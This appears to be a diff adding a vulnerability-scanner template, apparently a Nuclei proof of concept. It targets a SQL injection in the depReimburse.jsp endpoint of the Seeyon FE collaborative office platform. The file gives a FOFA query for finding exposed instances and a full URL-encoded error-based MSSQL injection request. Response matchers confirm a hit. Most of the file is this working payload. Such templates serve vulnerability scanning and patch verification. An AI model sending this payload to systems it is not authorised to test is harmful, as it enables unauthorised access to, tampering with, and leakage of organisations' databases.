@@ -1,0 +1,30 @@
+id: seeyon-fe-office-sqli-depreimburse
+
+info:
+  name: "致远互联 FE 协作办公平台 depReimburse 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="致远互联-FE"
+        致远互联FE协作办公平台的depReimburse接口存在SQL注入安全缺陷，攻击者可通过构造恶意SQL语句实现对数据库的未授权访问，包括但不限于数据篡改、删除操作或敏感信息泄露，最终可能导致数据完整性受损及机密性泄露。
+  tags: 致远互联
+
+http:
+- raw:
+  - |
+    GET /witapprovemanage/report/depReimburse.jsp?depid=1+AND+8218+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%288218%3D8218%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate, br
+    Connection: close
+    Cookie: JSESSIONID=F4350FBCDD24A8F9F8BBE1B1F9F87362
+    Upgrade-Insecure-Requests: 1
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'qqqqq1qzx'
